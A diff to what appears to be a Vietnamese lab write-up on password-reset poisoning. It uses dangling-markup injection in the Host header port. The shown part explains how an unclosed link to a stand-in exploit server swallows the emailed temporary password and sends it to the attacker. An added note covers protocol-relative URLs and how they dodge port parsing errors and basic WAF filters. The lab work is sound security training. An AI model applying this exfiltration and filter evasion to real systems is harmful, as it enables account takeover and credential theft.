@@ -166,7 +166,14 @@ Khi backend ghép nối chuỗi này vào mẫu email, đoạn mã HTML kết qu
 
 * **Cơ chế kích hoạt**: Dấu nháy đơn ngay sau dấu hai chấm sẽ đóng thuộc tính `href='` ban đầu.
 * **Nuốt mã HTML**: Thẻ `<a href="//exploit-server/?` mới được mở ra với dấu ngoặc kép chưa có phần đóng.
-* **Hệ quả**: Trình xử lý HTML sẽ coi toàn bộ văn bản tiếp theo (bao gồm `/login'>click here</a></p><p>Your new password is: [PASSWORD]</p>`) là giá trị của thuộc tính `href` và gửi kèm vào đường dẫn truy vấn.
+* **Hệ quả**: Trình xử lý HTML sẽ coi toàn bộ văn bản tiếp theo (bao gồm phần chứa mật khẩu tạm thời) là giá trị của thuộc tính `href` và gửi kèm vào đường dẫn truy vấn khi nạn nhân mở liên kết.
+
+> [!NOTE]
+> **Tại sao sử dụng `//exploit-server.net` thay vì `https://exploit-server.net`?**
+>
+> 1. **Protocol-Relative URL (RFC 3986):** Ký hiệu `//` ở đầu đường dẫn giúp URL tự động kế thừa giao thức của môi trường hiện tại (HTTP hoặc HTTPS) mà client đang sử dụng để xem email. Trình duyệt vẫn hiểu và điều hướng tuyệt đối đến tên miền máy chủ của kẻ tấn công.
+> 2. **Tránh xung đột cú pháp phân tích cổng mạng:** Cấu trúc tiêu chuẩn của trường Host header là `Host: <hostname>:<port>`. Khi chèn payload sau dấu hai chấm (`:`), nếu dùng `https://` thì sẽ xuất hiện thêm một dấu `:` thứ hai trong header. Nhiều Reverse Proxy hoặc Web Server sẽ nhận diện cấu trúc cổng không hợp lệ và phản hồi lỗi `400 Bad Request`. Việc dùng `//` loại bỏ triệt để dấu `:` thứ hai này.
+> 3. **Vượt qua bộ lọc WAF:** Một số hệ thống phòng thủ kiểm tra sự xuất hiện của các tiền tố giao thức tường minh như `http://` hoặc `https://` bên trong `Host` header. Cú pháp `//` giúp payload tinh gọn và vượt qua các quy tắc lọc cơ bản này.
 
 Gửi yêu cầu đặt lại mật khẩu cho tài khoản carlos kèm theo payload đã chuẩn bị:
 
